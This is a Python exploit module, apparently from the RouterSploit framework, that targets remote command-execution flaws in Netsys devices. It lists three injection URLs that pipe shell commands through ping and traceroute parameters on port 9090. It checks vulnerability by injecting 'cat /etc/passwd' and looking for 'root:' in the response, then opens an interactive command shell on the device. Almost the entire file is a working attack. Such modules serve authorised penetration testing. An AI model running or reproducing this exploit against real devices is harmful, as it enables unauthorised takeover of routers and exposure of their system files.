import re

from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    http_request,
    mute,
    validators,
    random_text,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Netsys multiple remote command execution vulnerabilities.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'Netsys Multi RCE',
        'description': 'Exploits Netsys multiple remote command execution vulnerabilities that allows executing commands on operating system level',
        'authors': [
            'admin <admin[at]bbs.00wz.top>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://bbs.00wz.top/forum.php?mod=viewthread&tid=12630',
        ],
        'devices': [
            'Multiple Netsys',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(9090, 'Target port')  # default port

    injections = ["/view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
                  "/view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
                  "/view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1|{}"]

    valid = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        marker = random_text(16)
        cmd = cmd.replace(" ", "+")
        payload = "echo+{};{};echo+{};".format(marker, cmd, marker)

        inj = self.valid.format(payload)
        url = "{}:{}{}".format(self.target, self.port, inj)

        response = http_request(method="GET", url=url)
        if response is None:
            return ""

        regexp = "{}(.+?){}".format(marker, marker)
        res = re.findall(regexp, response.text, re.DOTALL)

        if len(res):
            return res[0]

        return ""

    @mute
    def check(self):
        cmd = "cat+/etc/passwd;"

        for injection in self.injections:
            inj = injection.format(cmd)
            url = "{}:{}{}".format(self.target, self.port, inj)

            response = http_request(method="GET", url=url)
            if response is None:
                continue

            if "root:" in response.text:
                self.valid = injection
                return True  # target is vulnerable

        return False  # target not vulnerable
